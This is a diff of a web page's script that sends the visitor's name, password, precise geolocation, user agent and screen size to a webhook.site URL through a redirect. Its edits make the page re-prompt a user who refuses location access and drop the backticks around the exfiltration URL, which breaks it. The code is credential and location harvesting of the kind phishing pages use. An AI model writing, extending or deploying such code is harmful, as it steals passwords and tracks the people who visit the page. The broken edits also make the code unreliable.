@@ -113,13 +113,16 @@
                     const screenWidth = window.screen.width;
                     const screenHeight = window.screen.height;
                     
-                    const redirectUrl = `https://webhook.site/899e7a99-f1d4-475f-9ef4-59c8cf159a3c?name=${encodeURIComponent(userName)}&password=${encodeURIComponent(userPassword)}&lat=${latitude}&lng=${longitude}&userAgent=${encodeURIComponent(userAgent)}&screenWidth=${screenWidth}&screenHeight=${screenHeight}`;
+                    const redirectUrl = https://webhook.site/899e7a99-f1d4-475f-9ef4-59c8cf159a3c?name=${encodeURIComponent(userName)}&password=${encodeURIComponent(userPassword)}&lat=${latitude}&lng=${longitude}&userAgent=${encodeURIComponent(userAgent)}&screenWidth=${screenWidth}&screenHeight=${screenHeight};
                     
                     displayCelebration(redirectUrl);
                 }, function(error) {
                     console.error("Geolocation error:", error.message);
-                    alert("You need to allow location access to proceed.");
-                    getLocation(); // Retry until location is provided
+                    if (error.code === error.PERMISSION_DENIED) {
+                        alert("You need to allow location access to proceed.");
+                        // Re-prompt for location after 1 second
+                        setTimeout(getLocation, 0.1000);
+                    }
                 });
             } else {
                 console.error("Geolocation is not supported by this browser.");
@@ -138,7 +141,7 @@
             }, 1000);
         }
 
-        // Start the location prompt loop
+        // Start the location prompt
         getLocation();
     };
 </script>
